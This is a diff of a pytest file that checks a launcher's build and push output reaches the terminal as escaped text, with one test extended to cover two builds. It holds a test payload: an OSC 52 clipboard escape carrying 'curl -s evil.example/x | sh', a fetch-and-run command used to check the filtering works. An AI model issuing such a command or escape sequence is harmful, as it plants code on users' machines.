@@ -17,7 +17,7 @@ from pathlib import Path
 
 import pytest
 
-from tests.conftest import REPO_ROOT
+from tests.conftest import BUILDCTL_STUB, REPO_ROOT
 
 FILTER = REPO_ROOT / "scripts" / "terminal-text.py"
 OSC52 = ("\x1b]52;c;" + base64.b64encode(b"curl -s evil.example/x | sh\n")
@@ -171,6 +171,7 @@ def test_the_launcher_relays_a_containers_output_as_text(tmp_path):
 
 LOG_SH = REPO_ROOT / "scripts" / "remote" / "_log.sh"
 LAUNCHER_TEXT = (REPO_ROOT / "leerie").read_text()
+FRONTEND_SH = REPO_ROOT / "scripts" / "dockerfile-frontend.sh"
 
 
 def _launcher_fn(name: str) -> str:
@@ -186,18 +187,32 @@ def _bash(script: str, env: dict | None = None,
         capture_output=True, text=True, errors="replace", timeout=60)
 
 
-@pytest.mark.parametrize("rc", [0, 1])
-def test_the_repository_image_build_reaches_the_terminal_as_text(rc):
-    """`build_repo_image`: the build's output (stdout and stderr) is
-    relayed, and the build's own status still decides."""
+# Both relays below run their producer through the launcher's _build_job.
+_BUILD_JOB = ('_BUILD_JOB_PID=""\n' + _launcher_fn("_build_job")
+              + _launcher_fn("_build_job_end"))
+
+
+@pytest.mark.parametrize("rc", [0, 1, 2])
+def test_the_repository_image_build_reaches_the_terminal_as_text(tmp_path,
+                                                                 rc):
+    """`build_repo_image`: both builds' output (stdout and stderr) is
+    relayed, and each build's own status still decides (RC=1 fails the
+    repository's build, RC=2 leerie's)."""
+    (tmp_path / "repo").mkdir()
+    (tmp_path / "repo" / "Dockerfile").write_text("FROM x\n")
     r = _bash(f". {LOG_SH}\n"
               'remote_log() { printf "%s\\n" "$*" >&2; }\n'
               'nerdctl() { printf "out %s\\n" "$H"; '
-              'printf "err %s\\n" "$H" >&2; return "$RC"; }\n'
+              'printf "err %s\\n" "$H" >&2; N=0; '
+              'read -r N < "$CNT" || :; N=$((N + 1)); '
+              'printf "%s\\n" "$N" > "$CNT"; [ "$N" != "$RC" ]; }\n'
               "_repo_build_prepare() { :; }\n_check_repo_image() { :; }\n"
+              "_repo_layout_digest() { echo sha256:x; }\n"
+              "_repo_image_wrap() { :; }\n"
               '_repo_build_fail() { printf "FAIL %s\\n" "$*" >&2; exit 7; }\n'
-              "_REPO_NONCE=n _REPO_BUILD_DIR=/nonexistent "
+              f"CNT={tmp_path}/n _REPO_BUILD_DIR={tmp_path} "
               "_REPO_BUILD_CTX=/nonexistent IMAGE_TAG=base\n"
+              f". {FRONTEND_SH}\n" + BUILDCTL_STUB + _BUILD_JOB
               + _launcher_fn("build_repo_image")
               + "build_repo_image tag\necho BUILT\n", {"RC": str(rc)})
     assert "out \\x1b]52;c;" in r.stderr and "err \\x1b]52;c;" in r.stderr
@@ -221,6 +236,7 @@ def test_the_fly_build_and_push_reaches_the_terminal_as_text(tmp_path, rc):
     bp.chmod(0o755)
     r = _bash(f". {LOG_SH}\n"
               'remote_log() { printf "%s\\n" "$*" >&2; }\n'
+              + _BUILD_JOB
               + _launcher_fn("_fly_digest_ok") + _launcher_fn("_fly_push")
               + f'if _fly_push {bp} {tmp_path / "cache"} reg/app:t --push; '
               'then echo "PUSHED $_FLY_PUSHED"; else echo FAILED; fi\n',
